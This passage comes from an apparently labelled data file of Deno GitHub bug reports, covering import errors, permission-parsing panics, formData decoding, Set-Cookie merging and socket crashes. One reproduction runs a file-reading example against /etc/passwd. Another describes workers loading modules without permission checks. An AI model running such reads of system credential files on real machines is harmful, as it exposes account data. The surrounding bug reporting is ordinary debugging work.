https://cdn.pika.dev/-/rxjs@v6.5.5-p5HqDkhgdBZWx5yUAI3T/dist=es2019/rxjs.js\r\nDownload https://cdn.pika.dev/-/tslib@v1.11.1-8dB3VrqrGDhrGiHyfTgP/dist=es2019,mode=types/tslib.d.ts\r\nDownload https://cdn.pika.dev/-/rxjs@v6.5.5-p5HqDkhgdBZWx5yUAI3T/dist=es2019,mode=types/index.d.ts\r\n\r\nthread 'main' has overflowed its stack\r\n```"},{"labels":["bug",null],"text":"Dynamic imports is a decent feature for what it is capable of, however, it currently seems to lack the ability to load dynamic URLs. As an example, we cannot import a module from the current working directory in CLI tools:\r\n\r\n```ts\r\nimport(`${Deno.cwd()}/some_file.ts`).then(console.log);\r\n```\r\n\r\nFor regular dynamic imports of relative modules, a similar approach with a static string representing a module in a relative directory works:\r\n\r\n```ts\r\nimport(\"./relative.ts\").then(console.log);\r\n```\r\n\r\nIs there something I'm missing?"},{"labels":["bug"],"text":"~~~ Bash\r\necho 'import(\"xxx:\")' | deno\r\n# thread 'main' panicked at 'internal error: entered unreachable code'\r\n~~~\r\n\r\nI found this while trying to dynamically import a `data:` URL. I didn’t know they were unsupported — I don’t think they should be, but that’s another issue."},{"labels":["bug",null,null],"text":"If permissions are requested on a url which does not have a proto specified, the runtime panics. It looks like the error is in `cli/permissions.rs`:\r\n\r\nhttps://github.com/denoland/deno/blob/76ee6fb335f2ad779402e746d81c72f6c87614d9/cli/permissions.rs#L171-L184\r\n\r\nIt looks to me like the proto is thrown away anyway, but the use of `URL::parse` means that something with only a host and port is not properly parsed. As a solution, I would suggest allowing users to either continue to use the `url` as they currently can, but also offer a `{ host: string; port: number }` option to the interface.\r\n\r\n### Simple reproduction:\r\n\r\n```typescript\r\nawait Deno.permissions.request(\r\n    { name: \"net\", url: \"localhost:35242\" },\r\n);\r\n```\r\n\r\n```sh\r\n$ deno repro.ts \r\nCompile file:///[...elided]\r\nthread 'main' panicked at 'called `Option::unwrap()` on a `None` value', cli/permissions.rs:182:41\r\nnote: run with `RUST_BACKTRACE=1` environment variable to display a backtrace\r\nfatal runtime error: failed to initiate panic, error 5\r\n[1]    86239 abort      deno repro.ts\r\n```\r\n\r\n### Workaround\r\n\r\nAdding anything for the protocol causes parsing to succeed.\r\n\r\n```typescript\r\nawait Deno.permissions.request(\r\n    { name: \"net\", url: \"my-service://localhost:35242\" },\r\n);\r\n```\r\n\r\n### With backtrace:\r\n```sh\r\n$ RUST_BACKTRACE=1 deno repro.ts\r\nthread 'main' panicked at 'called `Option::unwrap()` on a `None` value', cli/permissions.rs:182:41\r\nstack backtrace:\r\n   0: <std::sys_common::backtrace::_print::DisplayBacktrace as core::fmt::Display>::fmt\r\n   1: core::fmt::write\r\n   2: std::io::Write::write_fmt\r\n   3: std::panicking::default_hook::{{closure}}\r\n   4: std::panicking::default_hook\r\n   5: std::panicking::rust_panic_with_hook\r\n   6: rust_begin_unwind\r\n   7: core::panicking::panic_fmt\r\n   8: core::panicking::panic\r\n   9: deno::permissions::DenoPermissions::get_state_net_url\r\n  10: deno::permissions::DenoPermissions::request_net\r\n  11: deno::ops::permissions::op_request_permission\r\n  12: deno::state::State::core_op::{{closure}}\r\n  13: deno_core::ops::OpRegistry::call\r\n  14: deno_core::isolate::Isolate::dispatch_op\r\n  15: deno_core::bindings::send\r\n  16: <extern \"C\" fn(A0) .> R as rusty_v8::support::CFnFrom<F>>::mapping::c_fn\r\n  17: _ZN2v88internal25FunctionCallbackArguments4CallENS0_15CallHandlerInfoE\r\n  18: _ZN2v88internal12_GLOBAL__N_119HandleApiCallHelperILb0EEENS0_11MaybeHandleINS0_6ObjectEEEPNS0_7IsolateENS0_6HandleINS0_10HeapObjectEEESA_NS8_INS0_20FunctionTemplateInfoEEENS8_IS4_EENS0_16BuiltinArgumentsE\r\n  19: _ZN2v88internalL26Builtin_Impl_HandleApiCallENS0_16BuiltinArgumentsEPNS0_7IsolateE\r\nnote: Some details are omitted, run with `RUST_BACKTRACE=full` for a verbose backtrace.\r\nfatal runtime error: failed to initiate panic, error 5\r\n[1]    87069 abort      RUST_BACKTRACE=1 deno repro.ts\r\n```\r\n\r\n### With full backtrace:\r\n```sh\r\nRUST_BACKTRACE=full deno repro.ts         \r\nthread 'main' panicked at 'called `Option::unwrap()` on a `None` value', cli/permissions.rs:182:41\r\nstack backtrace:\r\n   0:        0x110017fb5 - <std::sys_common::backtrace::_print::DisplayBacktrace as core::fmt::Display>::fmt::hff7732c2e44ef8b9\r\n   1:        0x11003eabd - core::fmt::write::hd42cb3dea57bae40\r\n   2:        0x11001006b - std::io::Write::write_fmt::ha39f6009af02b1d2\r\n   3:        0x11001a4fa - std::panicking::default_hook::{{closure}}::h389f076017b5df43\r\n   4:        0x11001a1fa - std::panicking::default_hook::h04b06ec20c41bf02\r\n   5:        0x11001ab4d - std::panicking::rust_panic_with_hook::hccde7faed9a5c398\r\n   6:        0x11001a712 - rust_begin_unwind\r\n   7:        0x110064ccf - core::panicking::panic_fmt::h272b9afd5b7b725a\r\n   8:        0x110064c27 - core::panicking::panic::h8627f9662a331d41\r\n   9:        0x10eea6263 - deno::permissions::DenoPermissions::get_state_net_url::h6035cc8eb9dbbe0f\r\n  10:        0x10eea69bf - deno::permissions::DenoPermissions::request_net::ha3d7390ecbd8b296\r\n  11:        0x10ece49bd - deno::ops::permissions::op_request_permission::hc07c1fb2227c6411\r\n  12:        0x10ed53441 - deno::state::State::core_op::{{closure}}::ha06894f58039d3cb\r\n  13:        0x10f495370 - deno_core::ops::OpRegistry::call::hb1e4977de87486c5\r\n  14:        0x10f49b1ad - deno_core::isolate::Isolate::dispatch_op::h1e6ac889cb5eabcc\r\n  15:        0x10f481728 - deno_core::bindings::send::hdd6343e740bee9d2\r\n  16:        0x10f48818d - <extern \"C\" fn(A0) .> R as rusty_v8::support::CFnFrom<F>>::mapping::c_fn::hcba4fa5587bb0723\r\n  17:        0x10f513eaf - _ZN2v88internal25FunctionCallbackArguments4CallENS0_15CallHandlerInfoE\r\n  18:        0x10f5133c1 - _ZN2v88internal12_GLOBAL__N_119HandleApiCallHelperILb0EEENS0_11MaybeHandleINS0_6ObjectEEEPNS0_7IsolateENS0_6HandleINS0_10HeapObjectEEESA_NS8_INS0_20FunctionTemplateInfoEEENS8_IS4_EENS0_16BuiltinArgumentsE\r\n  19:        0x10f512a31 - _ZN2v88internalL26Builtin_Impl_HandleApiCallENS0_16BuiltinArgumentsEPNS0_7IsolateE\r\nfatal runtime error: failed to initiate panic, error 5\r\n[1]    87194 abort      RUST_BACKTRACE=full deno repro.ts\r\n```"},{"labels":["bug"],"text":"OK:\r\n```shell\r\ndeno --allow-read=/usr https://deno.land/std/examples/cat.ts /etc/passwd\r\nerror: Uncaught PermissionDenied: read access to \"/etc/passwd\", run again with the --allow-read flag\r\n► $deno$/ops/dispatch_json.ts:43:11\r\n    at unwrapResponse ($deno$/ops/dispatch_json.ts:43:11)\r\n    at Object.sendAsync ($deno$/ops/dispatch_json.ts:98:10)\r\n    at async Object.open ($deno$/files.ts:65:15)\r\n    at async https://deno.land/std/examples/cat.ts:4:16\r\n```\r\nBUG:\r\n```shell\r\n$ deno --allow-read=/etc https://deno.land/std/examples/cat.ts /etc/passwd\r\n# (nothing happens until you press return)\r\n\r\nerror: Uncaught Error: Bad file descriptor (os error 9)\r\n► $deno$/ops/dispatch_minimal.ts:63:11\r\n    at unwrapResponse ($deno$/ops/dispatch_minimal.ts:63:11)\r\n    at Object.sendAsyncMinimal ($deno$/ops/dispatch_minimal.ts:106:10)\r\n    at async Object.write ($deno$/ops/io.ts:66:18)\r\n    at async Object.copy ($deno$/io.ts:81:12)\r\n    at async https://deno.land/std/examples/cat.ts:5:3\r\n```\r\n```shell\r\n$cat /etc/passwd\r\n# works fine\r\n```\r\n```\r\ndeno --version\r\ndeno 0.41.0\r\nv8 8.2.308\r\ntypescript 3.8.3\r\n```\r\nUsing Cenos 8.1"},{"labels":["bug",null],"text":"Integration test `error_014_catch_dynamic_import_error` appears to be broken.\r\n\r\nIt expects that Deno finishes with exit code 1 and following output (from stdout):\r\n```\r\nCaught direct dynamic import error.\r\nTypeError: relative import path \"does not exist\" not prefixed with / or ./ or ../ Imported from \"[WILDCARD]/error_014_catch_dynamic_import_error.js\"\r\n\r\nCaught indirect direct dynamic import error.\r\nTypeError: relative import path \"does not exist either\" not prefixed with / or ./ or ../ Imported from \"[WILDCARD]/indirect_import_error.js\"\r\n\r\nCaught error thrown by dynamically imported module.\r\nError: An error\r\n    at file:///[WILDCARD]tests/subdir/throws.js:5:7\r\nCaught error thrown indirectly by dynamically imported module.\r\nError: An error\r\n    at file:///[WILDCARD]tests/subdir/throws.js:5:7\r\n```\r\n\r\nActual output (including **stderr**):\r\n```\r\nCaught direct dynamic import error.\r\nTypeError: relative import path \"does not exist\" not prefixed with / or ./ or ../ Imported from \"file:///Users/biwanczuk/dev/deno/cli/tests/error_014_catch_dynamic_import_error.js\"\r\n\r\nCaught indirect direct dynamic import error.\r\nTypeError: relative import path \"does not exist either\" not prefixed with / or ./ or ../ Imported from \"file:///Users/biwanczuk/dev/deno/cli/tests/subdir/indirect_import_error.js\"\r\n\r\nCaught error thrown by dynamically imported module.\r\nError: An error\r\n    at file:///Users/biwanczuk/dev/deno/cli/tests/subdir/throws.js:5:7\r\nCaught error thrown indirectly by dynamically imported module.\r\nError: An error\r\n    at file:///Users/biwanczuk/dev/deno/cli/tests/subdir/throws.js:5:7\r\nerror: Uncaught Error: An error\r\n    at file:///Users/biwanczuk/dev/deno/cli/tests/subdir/throws.js:5:7\r\n```\r\n\r\nNotice last two lines with `error: Uncaught Error` - I think that's wrong and it shouldn't be thrown (and return 0 exit code).\r\n\r\nRun the same file in Chrome:\r\n```\r\nCaught direct dynamic import error.\r\nTypeError: Failed to resolve module specifier 'does not exist'\r\n    at error_014_catch_dynamic_import_error.js:3\r\n    at error_014_catch_dynamic_import_error.js:31\r\nCaught indirect direct dynamic import error.\r\nTypeError: Failed to resolve module specifier \"does not exist either\". Relative references must start with either \"/\", \"./\", or \"../\".\r\nCaught error thrown by dynamically imported module.\r\nError: An error\r\n    at throws.js:5\r\nCaught error thrown indirectly by dynamically imported module.\r\nError: An error\r\n    at throws.js:5\r\n```"},{"labels":["bug",null,null],"text":"When there are unhandled promise rejections, when they are logged, they look just like unhandled throws, but they are different and should be noted as different.\r\n\r\nFor example, in the REPL:\r\n\r\n```\r\n> Promise.reject(new Error(\"boo\"));\r\nPromise {\r\n <rejected> Error: boo\r\n    at <unknown>:1:16\r\n    at evaluate ($deno$/repl.ts:64:34)\r\n    at Object.replLoop ($deno$/repl.ts:153:13)\r\n}\r\nerror: Uncaught Error: boo\r\n    at <unknown>:1:16\r\n    at evaluate ($deno$/repl.ts:64:34)\r\n    at Object.replLoop ($deno$/repl.ts:153:13)\r\n```"},{"labels":["bug",null],"text":"To reproduce:\r\n\r\nserver\r\n```\r\nimport { MultipartWriter } from \"https://deno.land/std/mime/multipart.ts\";\r\n\r\nconst s = serve({ port: 8000 });\r\n\r\nfor await (const req of s) {\r\n    const headers = new Headers();\r\n    const buf = new Deno.Buffer()\r\n    const file = await Deno.open('image.jpg')\r\n    const mw = new MultipartWriter(buf);\r\n    await mw.writeField(\"deno\", \"land\");\r\n    await mw.writeFile(\"file\", \"image.jpg\", file);\r\n    await mw.close()\r\n\r\n    headers.set('Content-Type', 'multipart/form-data; boundary=' + mw.boundary);\r\n    req.respond({ body: buf, headers })\r\n}\r\n```\r\nclient\r\n```\r\nconst res = await fetch('http://localhost:8000')\r\nconst form = await res.formData();\r\nawait Deno.writeFile('image.copy.jpg', await form.get('file').arrayBuffer())\r\n// image.jpg !== image.copy.jpg\r\n```\r\n\r\nhttps://github.com/denoland/deno/blob/0da042c6fe067996e09f5c544502534b14b48713/cli/js/web/fetch.ts#L101\r\n\r\nThis happens because `.formData()` parser from `fetch` converts everything to `UTF-8`, but only the non-file entries should be `UTF-8` decoded\r\n\r\nhttps://fetch.spec.whatwg.org/#dom-body-formdata\r\n\r\n> Parse bytes, using the value of the `boundary` parameter from mimeType, per the rules set forth in Returning Values from Forms: multipart/form-data. [RFC7578]\r\n\r\n> Each part whose `Content-Disposition` header contains a `filename` parameter must be parsed into an entry whose value is a File object whose contents are the contents of the part. The name attribute of the File object must have the value of the `filename` parameter of the part. The type attribute of the File object must have the value of the `Content-Type` header of the part if the part has such header, and `text/plain` (the default defined by [RFC7578] section 4.4) otherwise.\r\n> \r\n> Each part whose `Content-Disposition` header does not contain a `filename` parameter must be parsed into an entry whose value is the UTF-8 decoded without BOM content of the part. This is done regardless of the presence or the value of a `Content-Type` header and regardless of the presence or the value of a `charset` parameter.\r\n\r\nI understand that client side doesn't care much about this, since there's no need to handle files from `multipart/form-data` responses, but on the server this is definitely needed."},{"labels":["bug"],"text":"Version:\r\n```\r\ndeno 0.41.0\r\nv8 8.2.308\r\ntypescript 3.8.3\r\n```\r\nHow to reproduce:\r\n`deno bundle https://unpkg.com/@vaadin/router@1.7.1/dist/vaadin-router.js output.js`\r\nThe following error is produced:\r\n```\r\nerror: Uncaught URIError: relative import path \"my-view.js\" not prefixed with / or ./ or ../ Imported from \"https://unpkg.com/@vaadin/router@1.7.1/dist/vaadin-router.js\"\r\n► $deno$/ops/dispatch_json.ts:43:11\r\n    at unwrapResponse ($deno$/ops/dispatch_json.ts:43:11)\r\n    at Object.sendSync ($deno$/ops/dispatch_json.ts:72:10)\r\n    at Object.resolveModules ($deno$/ops/compiler.ts:11:10)\r\n    at resolveModules ($deno$/compiler/imports.ts:63:22)\r\n    at processImports ($deno$/compiler/imports.ts:147:27)\r\n    at Object.processImports ($deno$/compiler/imports.ts:156:13)\r\n    at async compile (file:///Users/runner/runners/2.169.0/work/deno/deno/cli/js/compiler.ts:131:31)\r\n    at async tsCompilerOnMessage (file:///Users/runner/runners/2.169.0/work/deno/deno/cli/js/compiler.ts:338:22)\r\n    at async workerMessageRecvCallback ($deno$/runtime_worker.ts:62:9)\r\n```\r\ndeno bundle appears to get caught up on this part of https://unpkg.com/@vaadin/router@1.7.1/dist/vaadin-router.js:\r\n```\r\n// Actions like `() => import('my-view.js')` are not expected to\r\n// end the resolution, despite the result is not empty. Checking\r\n// the result with a whitelist of values that end the resolution.\r\n```\r\nWhen this chunk of comments is removed from a local version of the file and `deno bundle` is attempted again it works without issue.\r\n\r\nDesired behavior:\r\nDeno bundle should ignore comments while looking for imports.\r\n\r\nAlso, thank you for creating such an incredible tool!"},{"labels":["bug",null],"text":"Deno 0.41, Mac 10.14.6\r\n\r\nIf you have a unix domain socket `sock`, `Deno.remove(\"sock\")` results in \r\n\r\n```\r\nError: Not a directory (os error 20)\r\n``` \r\n\r\nI tried adding the `{recusrsive:true}` flag, but that changed nothing. I am able to remove regular text files without problem.\r\n\r\nEdit: the socket is not in use, and I'm able to remove with `rm sock` naturally."},{"labels":["bug",null],"text":"Deno 0.41, Mac 10.14.6\r\n\r\nIf I create a listener on a unix domain socket, and create a Server from that, Deno crashes the moment a client connects.\r\n\r\nIn the code below, there is a commented out section that allowed me to check that the lower level UDS stuff basically works, meaning that it's probably something in Server that's causing this.\r\n\r\n```\r\nimport { Server } from \"https://deno.land/std/http/server.ts\";\r\n\r\nlet sock_path = Deno.args[Deno.args.length -1];\r\n\r\nserve();\r\n\r\nasync function serve() {\r\n\tconst listener = Deno.listen({ address: sock_path, transport: \"unix\" });\r\n\t\r\n\t/////////////// works:\r\n\t// let conn = await listener.accept()\r\n\t// let uint8 = new Uint8Array(2);\r\n\t// let r = await conn.read(uint8);\r\n\t// var string = new TextDecoder(\"utf-8\").decode(uint8);\r\n\t// console.log( \"read\", r, string);\r\n\r\n\t////////////////// crashes:\r\n\tconst server = new Server(listener);\r\n\tfor await (const request of server) {\r\n\t\tconsole.log(\"got a request\")\r\n\t}\r\n}\r\n```\r\n\r\n```\r\nRUST_BACKTRACE=1 deno --reload --allow-write --allow-read ds-appspace-runner.ts sock.sock\r\n```\r\n\r\nI do this to connect to the socket:\r\n\r\n```\r\nnc -U sock.sock\r\n```\r\n\r\nAnd bam:\r\n\r\n```\r\nthread 'main' panicked at 'already borrowed: BorrowMutError', /private/tmp/rust-20200323-71040-kiw2y8/rustc-1.42.0-src/src/libcore/cell.rs:878:9\r\nstack backtrace:\r\n   0: <std::sys_common::backtrace::_print::DisplayBacktrace as core::fmt::Display>::fmt\r\n   1: core::fmt::write\r\n   2: std::io::Write::write_fmt\r\n   3: std::panicking::default_hook::{{closure}}\r\n   4: std::panicking::default_hook\r\n   5: std::panicking::rust_panic_with_hook\r\n   6: rust_begin_unwind\r\n   7: core::panicking::panic_fmt\r\n   8: core::result::unwrap_failed\r\n   9: <futures_util::future::poll_fn::PollFn<F> as core::future::future::Future>::poll\r\n  10: <std::future::GenFuture<T> as core::future::future::Future>::poll\r\n  11: <futures_util::future::try_future::map_ok::MapOk<Fut,F> as core::future::future::Future>::poll\r\n  12: <futures_util::future::try_future::map_ok::MapOk<Fut,F> as core::future::future::Future>::poll\r\n  13: <&mut S as futures_core::stream::Stream>::poll_next\r\n  14: futures_util::stream::stream::StreamExt::poll_next_unpin\r\n  15: <deno_core::isolate::Isolate as core::future::future::Future>::poll\r\n  16: <deno_core::es_isolate::EsIsolate as core::future::future::Future>::poll\r\n  17: <std::future::GenFuture<T> as core::future::future::Future>::poll\r\n  18: std::thread::local::LocalKey<T>::with\r\n  19: tokio::macros::scoped_tls::ScopedKey<T>::set\r\n  20: tokio::runtime::basic_scheduler::BasicScheduler<P>::block_on\r\n  21: tokio::runtime::context::enter\r\n  22: deno::tokio_util::run_basic\r\n  23: deno::main\r\n  24: std::rt::lang_start::{{closure}}\r\n  25: std::panicking::try::do_call\r\n  26: __rust_maybe_catch_panic\r\n  27: std::rt::lang_start_internal\r\n  28: main\r\nnote: Some details are omitted, run with `RUST_BACKTRACE=full` for a verbose backtrace.\r\n```\r\n\r\nThis could be a dupe of #4511?"},{"labels":["bug",null],"text":"long.js\r\n```js\r\n.\r\n```\r\ntest.js\r\n```js\r\nimport { createRequire } from \"https://deno.land/std/node/module.ts\";\r\nconst require = createRequire(import.meta.url);\r\nrequire(\"./long.js\");\r\n```\r\nOutput:\r\n```\r\nerror: Uncaught #<Object>\r\n```\r\nThis can be easily fixed by changing this line to `throw err.thrown;`: https://github.com/denoland/deno/blob/f72f045de586a7d0e428b77f6a3e381178cc6674/std/node/module.ts#L1063\r\n\r\nBut then the following version of long.js causes panic:\r\n```js\r\n}\r\n```\r\n```\r\nthread 'main' panicked at 'assertion failed: lines.len() > line', cli\\compilers\\ts.rs:559:11\r\n```\r\nBecause the error points at the CJS wrapper. Node.js solves this by creating a function programmatically: https://github.com/nodejs/node/blob/6bcf96840121f2de61def5ad99700fb7eb6ac905/lib/internal/modules/cjs/loader.js#L1101-L1117"},{"labels":["bug"],"text":"When sending multiple `Set-Cookie` headers, they are combined to one header separated by commas. While this behavior is desired for other headers, such as Accept, the `Set-Cookie` header is not parsed correctly, at least under Firefox 75.\r\n\r\nI set the header as follows, where cookieHeaders is of type `[string, string][]`. \r\n\r\n```ts\r\nawait req.respond({ body: this.body, headers: new Headers([['content-type', this.mimeType], ...cookieHeaders, ...this.headers]), status: this.status });\r\n\r\nawait req.respond({ body: \"Hello World!\", headers: new Headers([\r\n    ['content-type', 'text/plain'],\r\n    [ \"Set-Cookie\", \"user.session=qwertz; Max-Age=86400\" ],\r\n    [ \"Set-Cookie\", \"a=123; Max-Age=86400\" ],\r\n    [ \"Set-Cookie\", \"b=456; Max-Age=86400\" ]\r\n  ]), \r\n  status: 200\r\n});\r\n```\r\n\r\nThis results in the following response headers in Firefox's network analysis.\r\n\r\n```http\r\nHTTP/1.1 200 OK\r\ncontent-type: text/plain\r\nset-cookie: user.session=qwertz; Max-Age=86400, a=123; Max-Age=86400, b=456; Max-Age=86400\r\ncontent-length: 12\r\n```\r\n\r\nWhen a new request is made to the URL, only the first specified header is actually set. The cookies a and b are ignored. These are the request headers from the 2nd request.\r\n\r\n\r\n```http\r\nHost: localhost:3001\r\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: de,en-US;q=0.7,en;q=0.3\r\nAccept-Encoding: gzip, deflate\r\nDNT: 1\r\nConnection: keep-alive\r\nCookie: user.session=qwertz\r\nUpgrade-Insecure-Requests: 1\r\nCache-Control: max-age=0\r\n```\r\n\r\nIn my opinion, the headers should look like this. Sending a header multiple times is totally legitimate and allowed by the HTTP specifications. This is, in my understanding, the reason why headers accept a `[string, string][]` and not a key-value object, since keys can be used multiple times.\r\n\r\n[https://tools.ietf.org/html/rfc6265#page-7](https://tools.ietf.org/html/rfc6265#page-7)\r\n\r\n```http\r\nHTTP/1.1 200 OK\r\ncontent-type: text/plain\r\nset-cookie: user.session=qwertz; Max-Age=86400\r\nset-cookie: a=123; Max-Age=86400\r\nset-cookie: b=456; Max-Age=86400\r\ncontent-length: 12\r\n```"},{"labels":["bug",null,null],"text":"`Deno.readAllSync(Deno.stdin)` always returns a zero length array, for example:\r\n\r\n```\r\n$ deno --version\r\ndeno 0.41.0\r\nv8 8.2.308\r\ntypescript 3.8.3\r\n\r\n$ echo Hello | deno eval \"console.log(Deno.readAllSync(Deno.stdin))\"\r\nUint8Array(0) []\r\n```\r\n\r\nI verified this behaviour on Ubuntu 18.04 and Windows 10.\r\n\r\nThe issue does does not occur in Deno v0.40.0"},{"labels":["bug"],"text":"When running a broken JS code (e.g., syntax error) through `deno_core::Isolate::execute()` method, the program panics."},{"labels":["bug",null],"text":"Running `deno doc` on \r\n```ts\r\n/**\r\n* Hello there, this is a multiline JSdoc.\r\n*\r\n* It has many lines\r\n*\r\n* Or not that many?\r\n*/\r\nexport function foo(a: string, b?: number, cb: (...cbArgs: unknown[]) => void, ...args: unknown[]): void {\r\n    console.log(\"Hello world\");\r\n}\r\n```\r\ngives\r\n```\r\nfunction foo(a: string, b?: number, cb: (cbArgs: unknown[]) => void, args: unknown[]): void\r\n  Hello there, this is a multiline JSdoc.\r\n\r\n```\r\ninstead of\r\n```\r\n\r\nfunction foo(a: string, b?: number, cb: (cbArgs: unknown[]) => void, args: unknown[]): void\r\n  Hello there, this is a multiline JSdoc.\r\n\r\n  It has many lines\r\n\r\n  Or not that many?\r\n```\r\n\r\n----\r\nTests for this do exist. [here](https://github.com/denoland/deno/blob/a7a3a771a0a0cb2df2a14bcf4b8c38bc69525dd6/cli/doc/tests.rs#L47-L151)"},{"labels":["bug",null],"text":"It turns out that when creating worker using `new Worker(\"./path/to/module\", ...);` API there is no permissions check for modules loaded. Workers are much like dynamic imports (`await import(...)`) so similarly proper permissions should be checked when loading worker modules. \r\n\r\nThe problem we're facing is that TS compiler doesn't check permissions when `op_fetch_source_file` is called - so effectively it is priviledged, which is related bug at #4383.\r\n\r\nAnother problem I thought of is that there's no permission hooks in `SourceFileFetcher`; it handles redirects \"transparently\", ie. returning source code after resolving all redirect - permissions should be checked before performing any IO.  \r\n\r\nThis is a bug that needs to be fixed before 1.0."},{"labels":["bug",null],"text":"**test.ts**\r\n```\r\nconsole.log('Hello')\r\n```\r\n\r\n**main.ts**\r\n```\r\nsetInterval(async () => {\r\n    const start = +new Date\r\n    const [ diagnostics, emitMap ] = await Deno.compile('./test.ts')\r\n    console.log(`Took ${+new Date - start} ms to compile`)\r\n    console.log(emitMap)\r\n}, 1000)\r\n```\r\n\r\n**deno main.ts output**\r\n```\r\nTook 357 ms to compile\r\n{\r\n file:///Users/jaka/Desktop/deno-compile-caching/test.js.map: \"{\\\"version\\\":3,\\\"file\\\":\\\"test.js\\\",\\\"sourceRoot\\\":\\\"\\\",\\\"sources\\\":[\\\"test.ts\\\"],\\\"names\\\":[],\\\"mappings\\\":\\\";AAAA,OAA...\",\r\n file:///Users/jaka/Desktop/deno-compile-caching/test.js: \"\\\"use strict\\\";\\nconsole.log('Hello');\\n//# sourceMappingURL=test.js.map\"\r\n}\r\n[... identical output infinitely ...]\r\n```\r\n\r\nThe `Deno.compile()` always takes 300ms+ and the output does not change even if `test.ts` is changed while the script is running. Curiously, mtime of `test{.ts.js,.ts.js.map,.meta}` in the cache directory are changing.\r\n\r\nExpected:\r\n  - When not changed: returns instantly, does not change files cache\r\n  - When changed: takes a while, picks up changes, changes files in cache\r\n\r\nActual:\r\n  - When not changed: takes a while, changes files in cache\r\n  - When changed: takes a while, does not pick up changes, changes files in cache\r\n\r\ndeno 0.40.0"},{"labels":["bug",null,null],"text":"Currently, every error thrown in worker has no trusted stacks, but only\r\n```\r\nat WorkerImpl.#poll ($deno$/web/workers.ts:140:17)\r\n```"},{"labels":["bug",null,null],"text":"deno 0.38.0\r\nWindows 10 (1909 18363.752)\r\n\r\nTried to upgrade to 0.40.0 using `deno upgrade` in PowerShell 6. Upgrade failed with the below output:\r\n\r\n```\r\nPS C:\\Users\\adisa> deno upgrade\r\nChecking for latest version\r\nNew version has been found\r\nDeno is upgrading to version 0.40.0\r\ndownloading https://github.com/denoland/deno/releases/download/v0.40.0/deno-x86_64-pc-windows-msvc.zip\r\ndownloading https://github-production-release-asset-2e65be.s3.amazonaws.com/133442384/250c2c00-79ce-11ea-91c9-27a6ea7c95db?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20200412%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20200412T095028Z&X-Amz-Expires=300&X-Amz-Signature=57d443f9d7805fd9845544bc74e03cd6016711d105d1a1d86ee38fc2a58d2cb1&X-Amz-SignedHeaders=host&actor_id=0&repo_id=133442384&response-content-disposition=attachment%3B%20filename%3Ddeno-x86_64-pc-windows-msvc.zip&response-content-type=application%2Foctet-stream\r\nExpand-Archive : The 'Expand-Archive' command was found in the module 'Microsoft.PowerShell.Archive', but the module\r\ncould not be loaded. For more information, run 'Import-Module Microsoft.PowerShell.Archive'.\r\nAt line:1 char:1\r\n+ Expand-Archive -Path C:\\Users\\adisa\\AppData\\Local\\Temp\\.tmpAya0X1\\den ...\r\n+ ~~~~~~~~~~~~~~\r\n    + CategoryInfo          : ObjectNotFound: (Expand-Archive:String) [], CommandNotFoundException\r\n    + FullyQualifiedErrorId : CouldNotAutoloadMatchingModule\r\n\r\nthread 'main' panicked at 'assertion failed: unpack_status.success()', cli\\upgrade.rs:172:3\r\nnote: run with `RUST_BACKTRACE=1` environment variable to display a backtrace\r\n```"},{"labels":["bug"],"text":"I was trying `createRequire` and stepping into a weird issue.\r\n\r\nThis is only reproducible on deno 0.40.0, not 0.39.0.\r\nI've only tested it on mac, 10.14 and 10.15, both with fresh installation of deno.\r\n@lucacasonato also confirmed that this is reproducible on mac and linux with deno 0.40.0, not 0.39.0.\r\n\r\nFor demo purpose, I have created 2 branches for this,\r\n`left_pad_fail` for failing and `left_pad_ok` for ok.\r\n\r\n```sh\r\ngit clone https://github.com/shian15810/denosaur.git\r\ncd denosaur\r\n\r\ngit checkout left_pad_fail\r\nnpm install\r\ndeno --allow-read --importmap import_map.json mod.ts # this is failing\r\n\r\ngit checkout left_pad_ok\r\ndeno --allow-read --importmap import_map.json mod.ts # this is ok\r\n```\r\n\r\nOn branch `left_pad_fail`, deno is stuck at `require('left-pad')` indefinitely. I can only trace it down to this block of code:\r\n\r\nhttps://github.com/denoland/deno/blob/0cf4ac91e6917b76c00d3d4b790e9fefc4dc5323/std/node/module.ts#L653-L658\r\n\r\n<details>\r\n  <summary>The debug log before it got stuck:</summary>\r\n\r\n```\r\nDEBUG JS - sendSync op_stat 17\r\n⚠️️  Granted read access to \"~/denosaur\"\r\nop_stat ~/denosaur false\r\nDEBUG JS - sendSync op_stat 17\r\n⚠️️  Granted read access to \"~/denosaur/my_mod\"\r\nop_stat ~/denosaur/my_mod false\r\nDEBUG JS - sendSync op_stat 17\r\n⚠️️  Granted read access to \"~/denosaur/my_mod.js\"\r\nop_stat ~/denosaur/my_mod.js false\r\nDEBUG JS - sendSync op_read_link 23\r\n⚠️️  Granted read access to \"~/denosaur/my_mod.js\"\r\nop_read_link ~/denosaur/my_mod.js\r\nDEBUG JS - sendSync op_open 8\r\n⚠️️  Granted read access to \"~/denosaur/package.json\"\r\nread rid=3\r\nread rid=3\r\nDEBUG JS - sendSync op_close 62\r\nDEBUG JS - sendSync op_open 8\r\n⚠️️  Granted read access to \"~/denosaur/my_mod.js\"\r\nread rid=4\r\nread rid=4\r\nDEBUG JS - sendSync op_close 62\r\nDEBUG JS - sendSync op_stat 17\r\n⚠️️  Granted read access to \"~/denosaur/node_modules\"\r\nop_stat ~/denosaur/node_modules false\r\nDEBUG JS - sendSync op_open 8\r\n⚠️️  Granted read access to \"~/denosaur/node_modules/left-pad/package.json\"\r\nread rid=5\r\n```\r\n</details>\r\n\r\nAdding some `console.log` to this block of code:\r\n\r\n```ts\r\nlet json: string | undefined;\r\ntry {\r\n  console.log('before');\r\n  json = new TextDecoder().decode(\r\n    Deno.readFileSync(path.toNamespacedPath(jsonPath))\r\n  );\r\n  console.log('after');\r\n} catch {\r\n  console.log('catch');\r\n}\r\n```\r\n\r\nOnly `before` is being printed before it got stuck.\r\n\r\n<details>\r\n  <summary>The debug log before it got stuck:</summary>\r\n\r\n```\r\nDEBUG JS - sendSync op_stat 17\r\n⚠️️  Granted read access to \"~/denosaur\"\r\nop_stat ~/denosaur false\r\nDEBUG JS - sendSync op_stat 17\r\n⚠️️  Granted read access to \"~/denosaur/my_mod\"\r\nop_stat ~/denosaur/my_mod false\r\nDEBUG JS - sendSync op_stat 17\r\n⚠️️  